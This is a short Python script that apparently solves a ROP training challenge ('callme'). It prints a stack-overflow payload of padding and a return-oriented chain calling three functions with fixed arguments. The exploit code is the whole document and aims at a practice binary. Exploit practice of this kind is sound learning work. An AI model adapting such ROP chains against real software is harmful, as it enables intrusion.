#!/usr/bin/python

import struct

rop = "A"*44
rop += struct.pack('<I', 0x080485c0)	# callme_one
rop += struct.pack('<I', 0x080488a8)	# pop args
rop += struct.pack('<I', 1)
rop += struct.pack('<I', 2)
rop += struct.pack('<I', 3)
rop += struct.pack('<I', 0x42424242)	# filler
rop += struct.pack('<I', 0x08048620)	# callme_two
rop += struct.pack('<I', 0x080488a8)	# pop args
rop += struct.pack('<I', 1)
rop += struct.pack('<I', 2)
rop += struct.pack('<I', 3)
rop += struct.pack('<I', 0x42424242)	# filler
rop += struct.pack('<I', 0x080485b0)	# callme_three
rop += struct.pack('<I', 0x90909090)	# filler
rop += struct.pack('<I', 1)
rop += struct.pack('<I', 2)
rop += struct.pack('<I', 3)

print rop
